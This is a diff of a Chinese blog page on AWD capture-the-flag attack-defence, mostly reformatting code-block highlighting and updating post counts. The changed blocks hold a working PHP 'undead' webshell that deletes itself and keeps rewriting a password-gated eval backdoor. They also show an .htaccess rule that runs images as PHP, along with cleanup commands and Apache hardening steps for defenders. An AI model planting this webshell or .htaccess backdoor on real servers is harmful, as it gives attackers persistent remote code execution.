@@ -380,8 +380,8 @@
 <h2 id="内存马">内存马</h2>
 <p>awd中最头疼的应该就是不死马了，可以打别人，别人也会向你服务器种不死马<br>
 比如像如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &apos;2.php&apos;;</span><br><span class="line">$code = &apos;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&apos;;</span><br><span class="line">while (1)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们如何发现它？</span><br><span class="line">ls -a</span><br><span class="line">如何解决？</span><br><span class="line">rm .webshell.php &amp;&amp; mkdir .webshell.php //建立一个和不死马一样名字的文件夹，这样不死马就写不进去了</span><br><span class="line">完全杀死不死马，得清理内存</span><br><span class="line">ps -aux|grep &apos;www-data&apos;|awk&apos;&#123;print$2&#125;&apos;|xargs kill -9 // 杀进程得在root或者www-data权限下</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">ignore_user_abort(<span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">set_time_limit(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">unlink(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">$file = <span class="string">'2.php'</span>;</span></span><br><span class="line"><span class="php">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="php">    file_put_contents($file,$code);</span></span><br><span class="line"><span class="php">    usleep(<span class="number">5000</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们如何发现它？</span><br><span class="line"><span class="keyword">ls</span> -a</span><br><span class="line">如何解决？</span><br><span class="line"><span class="keyword">rm</span> .webshell.php &amp;&amp; <span class="keyword">mkdir</span> .webshell.php <span class="comment">//建立一个和不死马一样名字的文件夹，这样不死马就写不进去了</span></span><br><span class="line">完全杀死不死马，得清理内存</span><br><span class="line">ps -aux|grep 'www-data'|awk'&#123;<span class="keyword">print</span><span class="variable">$2&#125;</span>'|xargs kill -9 <span class="comment">// 杀进程得在root或者www-data权限下</span></span><br></pre></td></tr></table></figure>
 <h2 id="webshell查杀">webshell查杀</h2>
 <p>因为比赛现场大多数都是没有网盾，所以你的webshell扫描工具联网是用不了的，<br>
 一定要选择可以离线使用的webshell查杀工具，可以选择D盾，但距离比赛前一天一定要升级一下裤<br>
@@ -401,7 +401,7 @@ SSRF<br>
 <ul>
 <li>.htaccess时常就会被当作后门使用，要注意，比如</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(gif|jpe?g|png)$&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "\.(gif|jpe?g|png)$"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="Apache安全加固">Apache安全加固</h2>
 <ul>
 <li>账号设置</li>
@@ -409,11 +409,11 @@ SSRF<br>
 <p>以专门的用户账号和用户组运行apache服务，这里要说明要熟悉不同系统apache.conf，httpd.conf的位置，centos，debian，ubuntu等<br>
 根据需要，为apache服务创建用户及用户组，如果没有设置用户和组，则新建用户，并在apache配置文件中进行指定</p>
 <p>创建apache用户组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd Apache</span><br></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">groupadd Apache</span></span><br></pre></td></tr></table></figure>
 <p>创建apache用户并加入apache用户组</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd apache -g Apache</span><br></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">useradd apache -g Apache</span></span><br></pre></td></tr></table></figure>
 <p>将下面两行设置参数加入apache配置文件http.conf,debian下可能是etc下的apache2/apache2.conf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User apache</span><br><span class="line">Group apache</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User apache</span><br><span class="line">Group apache</span><br></pre></td></tr></table></figure>
 <p>检查httpd.conf或者是apache2.conf配置文件中是否允许使用非专用账号运行（如root）apache服务<br>
 默认设置一般即符合要求，linux系统中默认使用apache或者nobody用户</p>
 <ul>
@@ -587,7 +587,7 @@ Server Root /usr/local/apahe</p>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -599,8 +599,8 @@ Server Root /usr/local/apahe</p>
               
               
               <div class="site-state-item site-state-tags">
-                <a href="/tag/index.html">
-                  <span class="site-state-item-count">56</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
